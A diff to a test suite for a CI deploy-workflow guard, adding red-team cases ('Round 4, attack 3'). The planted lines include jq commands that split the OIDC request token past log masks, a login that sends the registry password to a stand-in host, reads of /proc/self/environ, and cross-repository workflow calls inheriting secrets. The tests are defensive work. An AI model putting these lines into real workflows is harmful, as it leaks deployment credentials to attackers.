@@ -42,6 +42,7 @@ import {
   DEPLOY,
   DEPLOY_WORDS,
   deployStepFindings,
+  ENVIRONMENT_JOBS,
   evaluatedLines,
   evaluateIf,
   FAST_RECHECK_NONPROD,
@@ -60,6 +61,7 @@ import {
   ONE_OFF,
   OVERRIDES_JQ,
   outsideEvaluations,
+  PINNED_RUNS,
   PLAN_CALL,
   PREAMBLE,
   PROBE,
@@ -190,6 +192,8 @@ const PINNED_09 =
   "runs as written, whole and under its own if: (PINNED_RUNS): the records and main's ruleset the plan rests on and the plan itself, so no line of its own ends one early, forges what the plan reads or writes an output of its own"
 const PINNED_13 =
   'runs as written, whole and under its own if: (PINNED_RUNS): the release, the push, migrate with its record and the record job, so no line of its own tags, migrates or records by another commit, task or environment'
+const PINNED_10 =
+  'runs as written, whole and under its own if: (PINNED_RUNS): every run of a job that holds the deploy role, or the OIDC request token that gets it, so no line of its own reads, splits, prints or sends what the job holds or hands a pinned line another input'
 const OUTPUT_PINNED = 'writes an output only from a run the guard pins whole'
 
 const indent = (text: string, n: number) =>
@@ -1312,6 +1316,8 @@ describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => 
   const MASK = 'masks secrets.AWS_ACCOUNT_ID (::add-mask::) before the credentials action'
   const TRACE =
     'runs no set -x, set -o xtrace, env, printenv, export -p or declare -p, and no set, declare, export, local or readonly given no name'
+  const OWN =
+    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
 
   it('finds each planted breakage', () => {
     expect(added('set -x')).toEqual([at(readBack, TRACE)])
@@ -1364,6 +1370,7 @@ describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => 
       at(readBack, 'writes the job summary only through mask'),
     ])
     expect(added('echo "$COMMIT" mask >>"$GITHUB_STEP_SUMMARY"')).toEqual([
+      at(readBack, OWN),
       at(readBack, 'writes the job summary only through mask'),
     ])
     // get keeps its output only as the first command of a $( … ): bare, or after another in it, it prints.
@@ -1433,10 +1440,11 @@ describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => 
       `jq -n '$ENV' | mask | tee -a "$GITHUB_STEP_SUMMARY"`,
       "jq -rn 'env.AWS_SESSION_TOKEN' | mask",
       'cat /proc/self/environ | mask',
-      'echo "$AWS_SESSION_TOKEN" | mask',
     ]) {
       expect(added(line), line).toEqual([at(readBack, PRINTS)])
     }
+    // An AWS_ variable is no name the run owns either.
+    expect(added('echo "$AWS_SESSION_TOKEN" | mask')).toEqual([at(readBack, OWN), at(readBack, PRINTS)])
     // Round 2's GUARDS-01: a # right after a substitution's ) hides nothing that prints.
     expect(added('echo $(true)#;set -x')).toEqual([at(readBack, TRACE)])
     expect(added('echo $(true)#;env | base64 -w0')).toEqual([at(readBack, TRACE)])
@@ -2325,6 +2333,8 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
   const RUNS =
     'runs nothing but bash’s own, its functions, gh api, git merge-base, jq, the text tools, aws, skopeo and the pinned CLI, and names no npx, node, shell, source, eval, docker, python, make, curl, wget or script: no tool is handed a program to run'
   const WRITES = "writes no file but its outputs, its summary, prod-plan's diff and /dev/null"
+  // Every run of a credentialed job is pinned whole, so a plant in any of them is that finding too.
+  const pinned = (where: string) => at(where, PINNED_10)
   const LOADER =
     "sets no PATH, HOME (but CDK_FOLDER's), BASH_ENV or other variable that chooses what runs, and writes neither GITHUB_ENV nor GITHUB_PATH"
   const JOB_KEYS =
@@ -2375,22 +2385,27 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
     expect(added('nonprod', '"$TOOL" x')).toEqual([at(readBack('nonprod'), RUNS), refused('nonprod')])
     expect(added('nonprod', 'jq() { :; }')).toEqual([refused('nonprod'), at(readBack('nonprod'), DEFINES)])
     expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --no-rollback', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', REFUSED),
       at('nonprod (Deploy Services)', HELD),
     ])
     expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --hotswap', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', REFUSED),
       at('nonprod (Deploy Services)', HELD),
     ])
     expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --all', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', REFUSED),
       at('nonprod (Deploy Services)', HELD),
     ])
     expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --role-arn x', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', REFUSED),
       at('nonprod (Deploy Services)', HELD),
     ])
     expect(find('run "$CDK" deploy --app', 'run "$CDK" destroy --app', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', REFUSED),
       at('nonprod (Deploy Services)', HELD),
       at('nonprod (Deploy Services)', CLI),
@@ -2402,19 +2417,26 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
         '      - name: Roll back to the target\n',
       ),
     ).toEqual([
+      pinned('nonprod (Roll back to the target)'),
       at('nonprod (Roll back to the target)', REFUSED),
       at('nonprod (Roll back to the target)', HELD),
       at('nonprod (Roll back to the target)', CLI),
     ])
     expect(find('--no-lookups ', '', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', HELD),
       at('nonprod (Deploy Services)', CLI),
     ])
     // A change of folder, cd, is a builtin the table refuses outside a canonical text.
     expect(
       find(`          ${CDK_FOLDER}\n`, `          ${CDK_FOLDER}\n          cd "$GITHUB_WORKSPACE/infra"\n`, services),
-    ).toEqual([at('nonprod (Deploy Services), line 13', AS_BASH), at('nonprod (Deploy Services)', CLI)])
+    ).toEqual([
+      pinned('nonprod (Deploy Services)'),
+      at('nonprod (Deploy Services), line 13', AS_BASH),
+      at('nonprod (Deploy Services)', CLI),
+    ])
     expect(find('ASSEMBLY="$RUNNER_TEMP/assembly"', 'ASSEMBLY="$RUNNER_TEMP/assembly-previous"', services)).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', CLI),
     ])
     expect(
@@ -2424,6 +2446,7 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
         '      - name: What runs\n',
       ),
     ).toEqual([
+      pinned('nonprod (What runs)'),
       at(
         'nonprod (What runs)',
         'assigns CDK only in the preamble, as the registry package’s node_modules/aws-cdk/bin/cdk',
@@ -2445,6 +2468,7 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
     ])
     expect(credentialedCodeFindings(removedStep('nonprod', "The CLI is the registry's"), manifests, lockfile)).toEqual([
       at('nonprod', STEPS),
+      pinned("nonprod (The CLI is the registry's)"),
       at(
         'nonprod',
         'installs only the pinned CLI (npm ci --ignore-scripts -w @hearth/infra), then runs CLI_CHECK, before the credentials action',
@@ -2543,6 +2567,7 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
       job('nonprod'),
     )
     expect(credentialedCodeFindings(withText(DEPLOY, crossed), manifests, lockfile)).toEqual([
+      pinned('nonprod (The fast re-check)'),
       at('nonprod (The fast re-check)', RUNS),
       at('nonprod (The fast re-check)', HELD),
       refused('nonprod'),
@@ -2574,18 +2599,22 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
       credentialedCodeFindings(addedBefore('nonprod', 'Deploy Services', line, added), manifests, lockfile)
     const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
     expect(deployServices(assembly, '          RUNNER_TEMP="$GITHUB_WORKSPACE"\n')).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services)', LOADER),
     ])
     expect(deployServices(assembly, "          printf -v RUNNER_TEMP '%s' x\n")).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services), line 11', AS_BASH),
       at('nonprod (Deploy Services)', SETS),
     ])
     const folder = `          ${CDK_FOLDER}\n`
     expect(deployServices(folder, '          read -r ASSEMBLY <<<"x"\n')).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services), line 12', AS_BASH),
       at('nonprod (Deploy Services)', SETS),
     ])
     expect(deployServices(folder, '          ASSEMBLY+=/x\n')).toEqual([
+      pinned('nonprod (Deploy Services)'),
       at('nonprod (Deploy Services), line 12', AS_BASH),
       at('nonprod (Deploy Services)', CLI),
     ])
@@ -3478,7 +3507,7 @@ describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): wha
 describe('Round 4, attack 1: the ways past the allowlist (DPW-07 to DPW-10, DPW-13)', () => {
   const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
   const SETS_INPUT =
-    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads outside a step whose run the guard pins whole (TOKEN only on its own lines), and REGISTRY and RUN only on their own lines, so no line the guard holds is handed another input"
+    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
   const ENV =
     'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
   const MAPPING =
@@ -3826,7 +3855,7 @@ describe('Round 4, attack 2: the ways past the allowlist (DPW-02, DPW-10)', () =
   const FILES =
     'names no GITHUB_ENV, GITHUB_PATH or GITHUB_STATE, in any job: no step hands a later one of its job a variable (BASH_ENV, say, which bash reads before a pinned run), a folder to search first or a state'
   const SETS_INPUT =
-    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads outside a step whose run the guard pins whole (TOKEN only on its own lines), and REGISTRY and RUN only on their own lines, so no line the guard holds is handed another input"
+    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
   const BLOCK_SCALARS = `${DEPLOY}: DPW-02 writes a block scalar only as a run:, never as an env: entry, an output, an input or any other value, whose last line break GitHub keeps and the guard's reader drops`
   const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
   // deploy.yml with a run step of its own, named name, before one of a job's steps.
@@ -3973,10 +4002,195 @@ describe('Round 4, attack 2: the ways past the allowlist (DPW-02, DPW-10)', () =
     for (const value of ['"x-$STAGE"', `"hearth-\${STAGE}"`, '"$CLUSTER$STAGE"', '"arn:$STAGE"']) {
       expect(inForward(describeServices(value)), value).toContain(at('DPW-10', `nonprod (${forward})`, HELD))
     }
-    // The workflow's own words and its token's line still pass, outside a pinned step too.
-    expect(inForward(describeServices('"hearth-$STAGE"'))).toEqual([])
-    expect(inForward('TOKEN="probe-nonprod-deploy-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"')).toEqual([])
+    // The workflow's own words and its token's line pass every layer but the pin, which now holds this step
+    // whole too.
+    const pinned = at('DPW-10', `nonprod (${forward})`, PINNED_10)
+    expect(inForward(describeServices('"hearth-$STAGE"'))).toEqual([pinned])
+    expect(inForward('TOKEN="probe-nonprod-deploy-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"')).toEqual([pinned])
   }, 30_000)
+})
+
+describe('Round 4, attack 3: the ways past the allowlist (DPW-02, DPW-07, DPW-10)', () => {
+  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
+  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
+  const SETS_INPUT =
+    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
+  const OWN =
+    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
+  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
+  const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
+  const previous = '          ASSEMBLY="$RUNNER_TEMP/assembly-previous"\n'
+
+  // COMMANDS-A3-01: an own line sets ACCOUNT_ID, which the one line allowed to set REGISTRY reads, so the
+  // canonical login sends the registry password to a host of its own choosing; ACCOUNT_ID was set by a step's
+  // env: in the push and the mask alone, and pinned nowhere else.
+  it('lets no line of its own set the account id the registry is built from (COMMANDS-A3-01)', () => {
+    const where = 'nonprod (Roll back to the target)'
+    const login = lines(
+      'ACCOUNT_ID=host.invalid.example/x',
+      'REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"',
+      'get aws ecr get-login-password --region ap-southeast-1 | skopeo login --username AWS --password-stdin "$REGISTRY" 2>&1 | mask',
+    )
+    expect(credentialed(addedBefore('nonprod', 'Roll back to the target', assembly, login))).toEqual([
+      at('DPW-10', where, PINNED_10),
+      at('DPW-10', where, SETS_INPUT),
+    ])
+    // Any setter the table admits, in any step, the push's own included.
+    for (const set of ['ACCOUNT_ID=x', 'for ACCOUNT_ID in x; do echo "$ACCOUNT_ID"; done']) {
+      expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, lines(set))), set).toContain(
+        at('DPW-10', 'nonprod (Deploy Services)', SETS_INPUT),
+      )
+    }
+    const registry = '          REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"\n'
+    expect(credentialed(addedBefore('prod', 'Push the image', registry, lines('ACCOUNT_ID=x')))).toContain(
+      at('DPW-10', 'prod (Push the image)', SETS_INPUT),
+    )
+  })
+
+  // FLOW-A3-01: a credentialed run's own line hands jq the OIDC request token, which the runner puts in every
+  // run step of a job with id-token: write, and jq prints it split or sliced, in pieces no mask matches.
+  it('expands on a credentialed or record run’s own lines only the names it owns (FLOW-A3-01)', () => {
+    const split = `jq -nc --arg u "$ACTIONS_ID_TOKEN_REQUEST_URL" --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '[$u, ($t | split("."))]'`
+    const slice = `jq -n -r --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '$t | .[0:40], .[40:]'`
+    for (const [id, name, anchor, line] of [
+      ['nonprod', 'Deploy Services', assembly, split],
+      ['prod', 'Take the restore stage down', assembly, slice],
+      ['rollback-nonprod', 'Roll back Tasks and Services', previous, split],
+      ['rollback-prod', 'Roll back Tasks and Services', previous, split],
+    ] as const) {
+      const planted = addedBefore(id, name, anchor, lines(line))
+      expect(maskingFindings(planted), `${id} ${name}`).toEqual([at('DPW-07', `${id} (${name})`, OWN)])
+      expect(credentialed(planted), `${id} ${name}`).toEqual([at('DPW-10', `${id} (${name})`, PINNED_10)])
+    }
+    // The URL through a name of its own, the GitHub token gh reads itself, and a record job's run.
+    expect(
+      maskingFindings(addedBefore('nonprod', 'Deploy Services', assembly, lines('U="$ACTIONS_ID_TOKEN_REQUEST_URL"'))),
+    ).toEqual([at('DPW-07', 'nonprod (Deploy Services)', OWN)])
+    const tokenSplit = `jq -nc --arg t "$GH_TOKEN" '$t | split("")'`
+    expect(
+      maskingFindings(
+        addedBefore('nonprod', 'The fast re-check', '          newest=$(newest_release nonprod)\n', lines(tokenSplit)),
+      ),
+    ).toEqual([at('DPW-07', 'nonprod (The fast re-check)', OWN)])
+    const url = '          URL="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"\n'
+    expect(maskingFindings(addedBefore('record-prod', 'Write the record', url, lines(tokenSplit)))).toEqual([
+      at('DPW-07', 'record-prod (Write the record)', OWN),
+    ])
+    // A job that holds neither credentials nor records is no concern of this rule.
+    expect(
+      maskingFindings(
+        plant(
+          'node infra/scripts/deploy/smoke.ts',
+          `jq -n --arg t "$GITHUB_TOKEN" '$t' >/dev/null\n          node infra/scripts/deploy/smoke.ts`,
+          job('smoke-nonprod'),
+        ),
+      ),
+    ).toEqual([])
+  })
+
+  // FLOW-A3-02, and FLOW-A3-01's class: a credentialed run's own lines capture an AWS answer and print it split,
+  // past both masks. Every run of the five credentialed jobs is now pinned whole, under its own if:, so none has
+  // a line of its own at all.
+  it('pins every run of a job that holds the deploy role, so none has a line of its own (FLOW-A3-02)', () => {
+    const account = lines(
+      `ID=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Services" --query 'Stacks[0].StackId' --output text)`,
+      `jq -nc --arg i "$ID" '$i | split(":")[4] | split("")'`,
+    )
+    expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, account))).toEqual([
+      at('DPW-10', 'nonprod (Deploy Services)', PINNED_10),
+    ])
+    // A harmless line at the end of every run of each credentialed job is the finding of the rule that pins it.
+    const finders = {
+      'DPW-08': [prodPathFindings, PINNED_08],
+      'DPW-10': [credentialed, PINNED_10],
+      'DPW-13': [releaseFindings, PINNED_13],
+    } as const
+    for (const jobId of Object.keys(ENVIRONMENT_JOBS)) {
+      const each = workflowJobs(deployText).find(job => job.id === jobId)
+      const runs = (each === undefined ? [] : parsedSteps(each)).filter(step => step.run !== undefined)
+      expect(runs.length, jobId).toBeGreaterThan(0)
+      for (const { name = '' } of runs) {
+        const rule = PINNED_RUNS()[jobId]?.[name]?.rule
+        expect(rule, `${jobId} (${name})`).toBeDefined()
+        if (rule === undefined || rule === 'DPW-09') continue
+        const step = stepText(deployText, jobId, name)
+        const one = /^ {8}run: (?![|>])(.*)\n/m.exec(step)
+        const to =
+          one === null
+            ? `${step}          echo ready\n`
+            : step.replace(one[0], `        run: |\n          ${one[1]}\n          echo ready\n`)
+        const [finder, text] = finders[rule]
+        expect(finder(withText(DEPLOY, edited(deployText, step, to, job(jobId)))), `${jobId} (${name})`).toContain(
+          at(rule, `${jobId} (${name})`, text),
+        )
+      }
+    }
+    // A run step of a credentialed job that PINNED_RUNS doesn't name, and a pinned step under an if: of its own.
+    const renamed = plant('      - name: Deploy Services\n', '      - name: Deploy the services\n', job('nonprod'))
+    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy the services)', PINNED_10))
+    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy Services)', PINNED_10))
+    expect(
+      credentialed(
+        plant(
+          `        if: \${{ needs.gate.outputs.mode == 'rollback' }}\n`,
+          `        if: \${{ needs.gate.outputs.mode != 'deploy' }}\n`,
+          '      - name: Roll back to the target\n',
+        ),
+      ),
+    ).toContain(at('DPW-10', 'nonprod (Roll back to the target)', PINNED_10))
+  }, 60_000)
+
+  // A run pinned under another rule no longer lets its own lines set a name an aws value reads: only the
+  // commands its pinned text holds may, so a line added to the read-back that sets one is this rule's finding
+  // as well as its pin's.
+  it('lets a pinned run’s own lines set a name an aws value reads only by the commands it pins', () => {
+    const states = '              STATES=$(get aws elbv2 describe-target-health'
+    expect(
+      credentialed(
+        addedBefore('nonprod', 'Read back what runs', states, '              GROUP_ARN=file:///dev/fd/../environ\n'),
+      ),
+    ).toContain(at('DPW-10', 'nonprod (Read back what runs)', SETS_INPUT))
+  })
+
+  // YAML-A3-01: another workflow's job calls a reusable workflow the guard never reads (another repository's,
+  // or this one's at another ref) whose job names an environment or joins a deploy group, and can be handed
+  // that environment's secrets.
+  it('lets another workflow call only one of this repository’s at this commit, and hand it no secret (YAML-A3-01)', () => {
+    const CALLS =
+      'calls only another workflow of this repository at this commit (./.github/workflows/<file>.yml), never deploy.yml, one of another repository or one at another ref'
+    const SECRETS = 'hands no secret to a called workflow'
+    const ci = (id: string, rule: string) => `${CI}: DPW-02 ${id}: ${rule}`
+    const extra = (...keys: string[]) =>
+      plant('\njobs:\n', `\njobs:\n  extra:\n${keys.map(key => `    ${key}\n`).join('')}`, '', CI)
+    const elsewhere =
+      'uses: example-org/shared-workflows/.github/workflows/hold.yml@0123456789abcdef0123456789abcdef01234567'
+    expect(permissionFindings(extra(elsewhere, 'secrets: inherit'))).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
+    expect(
+      permissionFindings(
+        extra(
+          elsewhere,
+          'secrets:',
+          `  ROLE: \${{ secrets.AWS_DEPLOY_ROLE }}`,
+          `  ACCOUNT: \${{ secrets.AWS_ACCOUNT_ID }}`,
+        ),
+      ),
+    ).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
+    for (const uses of [
+      elsewhere,
+      'uses: example-org/example-repo/.github/workflows/secrets.yml@0123456789abcdef0123456789abcdef01234567',
+      'uses: ./.github/workflows/missing.yml',
+      'uses: ./.github/workflows/sub/secrets.yml',
+      'uses: ./.github/workflows/secrets.yml@main',
+      'uses: $/.github/workflows/secrets.yml',
+      'uses: ./.github/workflows/deploy.yml',
+    ]) {
+      expect(permissionFindings(extra(uses)), uses).toEqual([ci('extra', CALLS)])
+    }
+    // ci.yml's own call, handed the secrets; and the same call from a job of its own, which passes.
+    const own = '    uses: ./.github/workflows/secrets.yml\n'
+    expect(permissionFindings(plant(own, `${own}    secrets: inherit\n`, '', CI))).toEqual([ci('secrets', SECRETS)])
+    expect(permissionFindings(extra('uses: ./.github/workflows/secrets.yml'))).toEqual([])
+  })
 })
 
 describe('DPW-14 (C11-D76): the asset and release checks', () => {
